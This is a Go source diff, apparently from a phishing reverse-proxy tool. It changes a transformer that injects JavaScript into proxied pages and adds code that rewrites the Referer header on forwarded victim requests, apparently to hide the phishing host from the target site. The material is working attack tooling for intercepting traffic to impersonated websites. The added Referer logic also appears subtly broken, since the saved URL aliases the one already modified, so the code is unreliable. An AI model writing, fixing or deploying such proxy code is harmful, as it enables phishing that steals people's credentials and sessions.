@@ -63,12 +63,11 @@ func (j JavaScriptInjectionTransformer) Transform(response *http.Response) error
 	responseText, err := ioutil.ReadAll(response.Body)
 	responseBuffer := bytes.NewBuffer(responseText)
 	response.Body = ioutil.NopCloser(responseBuffer)
-
 	if err != nil {
 		return err
 	}
 
-	document, err := goquery.NewDocumentFromReader(responseBuffer)
+	document, err := goquery.NewDocumentFromResponse(response)
 	if err != nil {
 		return err
 	}
@@ -105,10 +104,13 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTT
 		return
 	}
 
+	oldUrl := request.URL
 	request.URL.Scheme = p.targetURL.Scheme
 	request.URL.Host = p.targetURL.Host
 	request.Host = p.targetURL.Host
 	request.RequestURI = ""
+	referer := request.Referer()
+	request.Header.Set("Referer", strings.Replace(referer, oldUrl.Host, p.targetURL.Host, -1))
 	resp, err := p.client.Do(request)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
